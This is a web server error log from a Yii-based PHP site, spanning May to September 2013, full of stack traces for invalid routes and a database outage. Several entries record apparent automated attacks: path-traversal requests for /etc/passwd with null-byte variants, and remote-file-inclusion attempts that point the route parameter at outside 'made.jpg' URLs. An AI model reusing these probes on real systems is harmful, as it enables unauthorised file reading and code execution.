2013/05/04 00:44:14 [error] [exception.CHttpException.400] exception 'CHttpException' with message 'Your request is invalid.' in /home1/godatwor/public_html/framework/web/CController.php:336
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CController.php(309): CController->invalidActionParams(Object(CInlineAction))
#1 /home1/godatwor/public_html/framework/web/CController.php(286): CController->runAction(Object(CInlineAction))
#2 /home1/godatwor/public_html/framework/web/CController.php(265): CController->runActionWithFilters(Object(CInlineAction), Array)
#3 /home1/godatwor/public_html/framework/web/CWebApplication.php(282): CController->run('pagemodule')
#4 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('pages/pagemodul...')
#5 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#6 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#7 {main}
REQUEST_URI=/index.php?r=pages/pagemodule/page/announcements
---
2013/05/04 01:19:39 [error] [exception.CHttpException.400] exception 'CHttpException' with message 'Your request is invalid.' in /home1/godatwor/public_html/framework/web/CController.php:336
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CController.php(309): CController->invalidActionParams(Object(CInlineAction))
#1 /home1/godatwor/public_html/framework/web/CController.php(286): CController->runAction(Object(CInlineAction))
#2 /home1/godatwor/public_html/framework/web/CController.php(265): CController->runActionWithFilters(Object(CInlineAction), Array)
#3 /home1/godatwor/public_html/framework/web/CWebApplication.php(282): CController->run('pagemodule')
#4 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('pages/pagemodul...')
#5 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#6 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#7 {main}
REQUEST_URI=/index.php?r=pages/pagemodule/page/aboutus
HTTP_REFERER=http://www.godatwork.org.sg/index.php?r=pages/pagemodule/page/announcements
---
2013/05/04 06:10:20 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'Unable to resolve the request "pages123/pagemodule/id/1".' in /home1/godatwor/public_html/framework/web/CWebApplication.php:286
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('pages123/pagemo...')
#1 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#2 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#3 {main}
REQUEST_URI=/index.php?r=pages123/pagemodule/id/1
---
2013/05/04 06:49:22 [error] [exception.CHttpException.400] exception 'CHttpException' with message 'Your request is invalid.' in /home1/godatwor/public_html/framework/web/CController.php:336
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CController.php(309): CController->invalidActionParams(Object(CInlineAction))
#1 /home1/godatwor/public_html/framework/web/CController.php(286): CController->runAction(Object(CInlineAction))
#2 /home1/godatwor/public_html/framework/web/CController.php(265): CController->runActionWithFilters(Object(CInlineAction), Array)
#3 /home1/godatwor/public_html/framework/web/CWebApplication.php(282): CController->run('pagemodule')
#4 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('pages/pagemodul...')
#5 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#6 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#7 {main}
REQUEST_URI=/index.php?r=pages/pagemodule/page/resources
---
2013/05/04 08:42:18 [error] [exception.CHttpException.400] exception 'CHttpException' with message 'Your request is invalid.' in /home1/godatwor/public_html/framework/web/CController.php:336
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CController.php(309): CController->invalidActionParams(Object(CInlineAction))
#1 /home1/godatwor/public_html/framework/web/CController.php(286): CController->runAction(Object(CInlineAction))
#2 /home1/godatwor/public_html/framework/web/CController.php(265): CController->runActionWithFilters(Object(CInlineAction), Array)
#3 /home1/godatwor/public_html/framework/web/CWebApplication.php(282): CController->run('pagemodule')
#4 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('pages/pagemodul...')
#5 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#6 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#7 {main}
REQUEST_URI=/index.php?r=pages/pagemodule/page/aboutus
---
2013/05/04 08:42:20 [error] [exception.CHttpException.400] exception 'CHttpException' with message 'Your request is invalid.' in /home1/godatwor/public_html/framework/web/CController.php:336
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CController.php(309): CController->invalidActionParams(Object(CInlineAction))
#1 /home1/godatwor/public_html/framework/web/CController.php(286): CController->runAction(Object(CInlineAction))
#2 /home1/godatwor/public_html/framework/web/CController.php(265): CController->runActionWithFilters(Object(CInlineAction), Array)
#3 /home1/godatwor/public_html/framework/web/CWebApplication.php(282): CController->run('pagemodule')
#4 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('pages/pagemodul...')
#5 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#6 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#7 {main}
REQUEST_URI=/index.php?r=pages/pagemodule/page/announcements
---
2013/05/04 08:42:22 [error] [exception.CHttpException.400] exception 'CHttpException' with message 'Your request is invalid.' in /home1/godatwor/public_html/framework/web/CController.php:336
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CController.php(309): CController->invalidActionParams(Object(CInlineAction))
#1 /home1/godatwor/public_html/framework/web/CController.php(286): CController->runAction(Object(CInlineAction))
#2 /home1/godatwor/public_html/framework/web/CController.php(265): CController->runActionWithFilters(Object(CInlineAction), Array)
#3 /home1/godatwor/public_html/framework/web/CWebApplication.php(282): CController->run('pagemodule')
#4 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('pages/pagemodul...')
#5 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#6 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#7 {main}
REQUEST_URI=/index.php?r=pages/pagemodule/page/getconnected
---
2013/05/04 08:42:25 [error] [exception.CHttpException.400] exception 'CHttpException' with message 'Your request is invalid.' in /home1/godatwor/public_html/framework/web/CController.php:336
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CController.php(309): CController->invalidActionParams(Object(CInlineAction))
#1 /home1/godatwor/public_html/framework/web/CController.php(286): CController->runAction(Object(CInlineAction))
#2 /home1/godatwor/public_html/framework/web/CController.php(265): CController->runActionWithFilters(Object(CInlineAction), Array)
#3 /home1/godatwor/public_html/framework/web/CWebApplication.php(282): CController->run('pagemodule')
#4 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('pages/pagemodul...')
#5 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#6 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#7 {main}
REQUEST_URI=/index.php?r=pages/pagemodule/page/resources
---
2013/05/04 08:42:27 [error] [exception.CHttpException.400] exception 'CHttpException' with message 'Your request is invalid.' in /home1/godatwor/public_html/framework/web/CController.php:336
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CController.php(309): CController->invalidActionParams(Object(CInlineAction))
#1 /home1/godatwor/public_html/framework/web/CController.php(286): CController->runAction(Object(CInlineAction))
#2 /home1/godatwor/public_html/framework/web/CController.php(265): CController->runActionWithFilters(Object(CInlineAction), Array)
#3 /home1/godatwor/public_html/framework/web/CWebApplication.php(282): CController->run('pagemodule')
#4 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('pages/pagemodul...')
#5 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#6 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#7 {main}
REQUEST_URI=/index.php?r=pages/pagemodule/page/updates
---
2013/05/04 08:42:29 [error] [exception.CHttpException.400] exception 'CHttpException' with message 'Your request is invalid.' in /home1/godatwor/public_html/framework/web/CController.php:336
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CController.php(309): CController->invalidActionParams(Object(CInlineAction))
#1 /home1/godatwor/public_html/framework/web/CController.php(286): CController->runAction(Object(CInlineAction))
#2 /home1/godatwor/public_html/framework/web/CController.php(265): CController->runActionWithFilters(Object(CInlineAction), Array)
#3 /home1/godatwor/public_html/framework/web/CWebApplication.php(282): CController->run('pagemodule')
#4 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('pages/pagemodul...')
#5 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#6 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#7 {main}
REQUEST_URI=/index.php?r=pages/pagemodule/page/visitus
---
2013/05/04 18:52:33 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'Unable to resolve the request "http://godatwork.org.sg/index.php".' in /home1/godatwor/public_html/framework/web/CWebApplication.php:286
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('http://godatwor...')
#1 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#2 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#3 {main}
REQUEST_URI=/index.php?r=http://godatwork.org.sg/index.php
HTTP_REFERER=http://godatwork.org.sg/index.php
---
2013/05/09 17:36:16 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'Unable to resolve the request "http://godatwork.org.sg/index.php?r=site/contact".' in /home1/godatwor/public_html/framework/web/CWebApplication.php:286
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('http://godatwor...')
#1 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#2 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#3 {main}
REQUEST_URI=/index.php?r=http://godatwork.org.sg/index.php?r=site/contact
HTTP_REFERER=http://godatwork.org.sg/index.php?r=site/contact
---
2013/05/09 17:36:43 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'Unable to resolve the request "http://godatwork.org.sg/index.php?r=site/contact".' in /home1/godatwor/public_html/framework/web/CWebApplication.php:286
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('http://godatwor...')
#1 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#2 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#3 {main}
REQUEST_URI=/index.php?r=http://godatwork.org.sg/index.php?r=site/contact
HTTP_REFERER=http://godatwork.org.sg/index.php?r=site/contact
---
2013/05/25 12:12:59 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'Unable to resolve the request "http://www.theindia.info/required/made.jpg?".' in /home1/godatwor/public_html/framework/web/CWebApplication.php:286
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('http://www.thei...')
#1 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#2 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#3 {main}
REQUEST_URI=/index.php?r=http://www.theindia.info/required/made.jpg?
---
2013/05/31 13:04:54 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'The system is unable to find the requested action "index".' in /home1/godatwor/public_html/framework/web/CController.php:483
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CController.php(270): CController->missingAction('')
#1 /home1/godatwor/public_html/framework/web/CWebApplication.php(282): CController->run('')
#2 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('site/')
#3 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#4 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#5 {main}
REQUEST_URI=/index.php?r=site/
---
2013/06/08 20:42:58 [error] [exception.CDbException] SQLSTATE[HY000] [2002] Can't connect to local MySQL server through socket '/var/lib/mysql/mysql.sock' (2)
2013/06/08 20:42:58 [error] [exception.CDbException] exception 'CDbException' with message 'CDbConnection failed to open the DB connection.' in /home1/godatwor/public_html/framework/db/CDbConnection.php:387
Stack trace:
#0 /home1/godatwor/public_html/framework/db/CDbConnection.php(330): CDbConnection->open()
#1 /home1/godatwor/public_html/framework/db/CDbConnection.php(308): CDbConnection->setActive(true)
#2 /home1/godatwor/public_html/framework/base/CModule.php(387): CDbConnection->init()
#3 /home1/godatwor/public_html/framework/base/CModule.php(103): CModule->getComponent('db')
#4 /home1/godatwor/public_html/godatworkorgsg/protected/controllers/PagesController.php(17): CModule->__get('db')
#5 /home1/godatwor/public_html/framework/web/actions/CInlineAction.php(49): PagesController->actionPageModule()
#6 /home1/godatwor/public_html/framework/web/CController.php(308): CInlineAction->runWithParams(Array)
#7 /home1/godatwor/public_html/framework/web/CController.php(286): CController->runAction(Object(CInlineAction))
#8 /home1/godatwor/public_html/framework/web/CController.php(265): CController->runActionWithFilters(Object(CInlineAction), Array)
#9 /home1/godatwor/public_html/framework/web/CWebApplication.php(282): CController->run('pagemodule')
#10 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('pages/pagemodul...')
#11 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#12 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#13 {main}
REQUEST_URI=/index.php?r=pages/pagemodule/id/6
HTTP_REFERER=http://www.godatwork.org.sg/index.php?r=pages/pagemodule/id/5
---
2013/06/08 20:42:58 [error] [exception.CDbException] SQLSTATE[HY000] [2002] Can't connect to local MySQL server through socket '/var/lib/mysql/mysql.sock' (2)
2013/06/10 20:29:41 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'Unable to resolve the request "http://www.socialokonomi.dk/cso/made.jpg?".' in /home1/godatwor/public_html/framework/web/CWebApplication.php:286
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('http://www.soci...')
#1 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#2 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#3 {main}
REQUEST_URI=/index.php?r=http://www.socialokonomi.dk/cso/made.jpg?
---
2013/07/03 08:56:34 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'The system is unable to find the requested action "index".' in /home1/godatwor/public_html/framework/web/CController.php:483
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CController.php(270): CController->missingAction('')
#1 /home1/godatwor/public_html/framework/web/CWebApplication.php(282): CController->run('')
#2 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('site/')
#3 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#4 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#5 {main}
REQUEST_URI=/index.php?r=site/
---
2013/07/12 00:34:34 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'The system is unable to find the requested action "index".' in /home1/godatwor/public_html/framework/web/CController.php:483
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CController.php(270): CController->missingAction('')
#1 /home1/godatwor/public_html/framework/web/CWebApplication.php(282): CController->run('')
#2 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('site/')
#3 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#4 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#5 {main}
REQUEST_URI=/index.php?r=site/
---
2013/07/19 21:18:40 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'Unable to resolve the request "http://www.solucionesmedicas.com.pe/made.jpg?".' in /home1/godatwor/public_html/framework/web/CWebApplication.php:286
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('http://www.solu...')
#1 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#2 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#3 {main}
REQUEST_URI=/index.php?r=http://www.solucionesmedicas.com.pe/made.jpg?
---
2013/07/21 17:48:02 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'Unable to resolve the request "http://www.solucionesmedicas.com.pe/made.jpg?".' in /home1/godatwor/public_html/framework/web/CWebApplication.php:286
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('http://www.solu...')
#1 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#2 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#3 {main}
REQUEST_URI=/index.php?r=http://www.solucionesmedicas.com.pe/made.jpg?
---
2013/08/24 16:18:57 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'The system is unable to find the requested action "index".' in /home1/godatwor/public_html/framework/web/CController.php:483
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CController.php(270): CController->missingAction('')
#1 /home1/godatwor/public_html/framework/web/CWebApplication.php(282): CController->run('')
#2 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('site/')
#3 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#4 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#5 {main}
REQUEST_URI=/index.php?r=site/
---
2013/08/27 10:33:38 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'Unable to resolve the request "../../../../../../../../../../../../../../../../../etc/passwd".' in /home1/godatwor/public_html/framework/web/CWebApplication.php:286
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('../../../../../...')
#1 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#2 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#3 {main}
REQUEST_URI=/index.php?r=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
---
2013/08/27 10:33:39 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'Unable to resolve the request "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd".' in /home1/godatwor/public_html/framework/web/CWebApplication.php:286
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('..%2F..%2F..%2F...')
#1 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#2 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#3 {main}
REQUEST_URI=/index.php
---
2013/08/27 10:33:40 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'Unable to resolve the request "../../../../../../../../../../../../../../../../../etc/passwd' in /home1/godatwor/public_html/framework/web/CWebApplication.php:286
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('../../../../../...')
#1 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#2 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#3 {main}
REQUEST_URI=/index.php?r=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
---
2013/08/27 10:33:41 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'Unable to resolve the request "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00".' in /home1/godatwor/public_html/framework/web/CWebApplication.php:286
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('..%2F..%2F..%2F...')
#1 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#2 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#3 {main}
REQUEST_URI=/index.php
---
2013/08/29 12:13:37 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'Unable to resolve the request "fdsfdf".' in /home1/godatwor/public_html/framework/web/CWebApplication.php:286
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('fdsfdf')
#1 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#2 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#3 {main}
REQUEST_URI=/index.php?r=fdsfdf
---
2013/08/29 12:13:48 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'Unable to resolve the request "645656 4564 565".' in /home1/godatwor/public_html/framework/web/CWebApplication.php:286
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('645656 4564 565')
#1 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#2 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#3 {main}
REQUEST_URI=/index.php?r=645656%204564%20565
---
2013/08/29 12:14:03 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'Unable to resolve the request "Select * from".' in /home1/godatwor/public_html/framework/web/CWebApplication.php:286
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('Select * from')
#1 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#2 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#3 {main}
REQUEST_URI=/index.php?r=Select%20*%20from
---
2013/09/05 10:27:45 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'Unable to resolve the request "../../../../../../../../../../../../../../../../../etc/passwd".' in /home1/godatwor/public_html/framework/web/CWebApplication.php:286
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('../../../../../...')
#1 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#2 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#3 {main}
REQUEST_URI=/index.php?r=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
---
2013/09/05 10:27:46 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'Unable to resolve the request "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd".' in /home1/godatwor/public_html/framework/web/CWebApplication.php:286
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('..%2F..%2F..%2F...')
#1 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#2 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#3 {main}
REQUEST_URI=/index.php
---
2013/09/05 10:27:47 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'Unable to resolve the request "../../../../../../../../../../../../../../../../../etc/passwd' in /home1/godatwor/public_html/framework/web/CWebApplication.php:286
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('../../../../../...')
#1 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#2 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#3 {main}
REQUEST_URI=/index.php?r=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
---
2013/09/05 10:27:48 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'Unable to resolve the request "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00".' in /home1/godatwor/public_html/framework/web/CWebApplication.php:286
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('..%2F..%2F..%2F...')
#1 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#2 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#3 {main}
REQUEST_URI=/index.php
---
2013/09/05 10:27:49 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'Unable to resolve the request "../../../../../../../../../../../../../../../../../etc/passwd".' in /home1/godatwor/public_html/framework/web/CWebApplication.php:286
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('../../../../../...')
#1 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#2 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#3 {main}
REQUEST_URI=/index.php?r=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
---
2013/09/05 10:27:50 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'Unable to resolve the request "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd".' in /home1/godatwor/public_html/framework/web/CWebApplication.php:286
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('..%2F..%2F..%2F...')
#1 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#2 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#3 {main}
REQUEST_URI=/index.php
---
2013/09/05 10:27:51 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'Unable to resolve the request "../../../../../../../../../../../../../../../../../etc/passwd' in /home1/godatwor/public_html/framework/web/CWebApplication.php:286
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('../../../../../...')
#1 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#2 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#3 {main}
REQUEST_URI=/index.php?r=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
---
2013/09/05 10:27:52 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'Unable to resolve the request "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00".' in /home1/godatwor/public_html/framework/web/CWebApplication.php:286
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('..%2F..%2F..%2F...')
#1 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#2 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#3 {main}
REQUEST_URI=/index.php
---
2013/09/05 10:27:52 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'Unable to resolve the request "../../../../../../../../../../../../../../../../../etc/passwd".' in /home1/godatwor/public_html/framework/web/CWebApplication.php:286
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('../../../../../...')
#1 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#2 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#3 {main}
REQUEST_URI=/index.php?r=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
---
2013/09/05 10:27:53 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'Unable to resolve the request "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd".' in /home1/godatwor/public_html/framework/web/CWebApplication.php:286
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('..%2F..%2F..%2F...')
#1 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#2 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#3 {main}
REQUEST_URI=/index.php
---
2013/09/05 10:27:54 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'Unable to resolve the request "../../../../../../../../../../../../../../../../../etc/passwd' in /home1/godatwor/public_html/framework/web/CWebApplication.php:286
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('../../../../../...')
#1 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#2 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#3 {main}
REQUEST_URI=/index.php?r=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
---
2013/09/05 10:27:55 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'Unable to resolve the request "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00".' in /home1/godatwor/public_html/framework/web/CWebApplication.php:286
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('..%2F..%2F..%2F...')
#1 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#2 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#3 {main}
